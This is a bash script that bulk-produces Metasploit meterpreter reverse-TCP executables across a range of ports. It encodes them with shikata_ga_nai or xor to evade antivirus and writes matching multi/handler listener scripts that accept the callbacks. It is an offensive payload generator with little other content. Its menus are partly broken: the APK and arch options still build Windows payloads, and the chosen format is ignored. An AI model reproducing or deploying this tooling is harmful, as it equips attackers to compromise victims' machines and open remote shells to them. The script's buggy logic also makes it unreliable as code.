#!/bin/bash

function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}

start=${1:-"start"}

jumpto $start

symbol1=$(toilet -f digital -F metal ....mAsS.PaYLoAD.cReAtIoN......)
echo "$symbol1"

###get platform list

refrehstart:
echo "------------------------------------------------"
echo
echo
echo "choose a platform"
echo "1 = 32"
echo "2 = 64"
echo "3 = apk"
echo "4 = arch"
echo
read choice
case $choice in
    ''|*[!1-4]*) jumpto refrehstart ;;
    *) echo  ;;
esac
echo

if [ "$choice" = "1" ]
then
    plattform="Windows"
    payload=windows/meterpreter_reverse_tcp
    encoder=x86/shikata_ga_nai
    arch=x86
    format=exe
elif [ "$choice" = "2" ]
then
    plattform="Windows"
    payload=windows/meterpreter_reverse_tcp
    encoder=x64/xor
    arch=x64
    format=exe
elif [ "$choice" = "3" ]
then
    plattform="Windows"
    payload=windows/meterpreter_reverse_tcp
    encoder=x86/shikata_ga_nai
    arch=x86
elif [ "$choice" = "4" ]
then
    plattform="Windows"
    payload=windows/meterpreter_reverse_tcp
    encoder=x86/shikata_ga_nai
    arch=x86
fi
formatstart:
echo "------------------------------------------------"
echo

echo "choose a format"
echo "1 = exe"
echo "2 = java"
echo "3 = js"
echo "4 = php"
echo
read choice
case $choice in
    ''|*[!1-4]*) jumpto formatstart ;;
    *) echo  ;;
esac
echo
echo
echo "choose start PORT"
echo
read choice
portmin=$choice

echo "------------------------------------------------"
echo
echo
echo "choose a RANGE"
echo
read choice
portrange=$choice

echo "------------------------------------------------"
echo
echo
echo "choose a IP"
echo
read choice
ip=$choice




ports=$(($portmin + $portrange));
echo $ports;
homeip=192.168.2.1
folder=inover

for (( i=$portmin; i<$ports; i++ ))
do
    mkdir /root/msf_framework/payloads/$i;
    path="/root/msf_framework/payloads/$i";
    msfvenom -a x86 --platform Windows -e $encoder -p $payload LHOST=$ip LPORT=$i -f $format --out "$path/run.exe";
    echo "use exploit/multi/handler" > $path/starter;
    echo "set payload $payload" >> $path/starter;
    echo "set LHOST $homeip" >> $path/starter;
    echo "set LPORT $i" >> $path/starter;
    echo "set ExitOnSession false" >> $path/starter;
    echo "exploit -j -z" >> $path/starter;

    
    
done







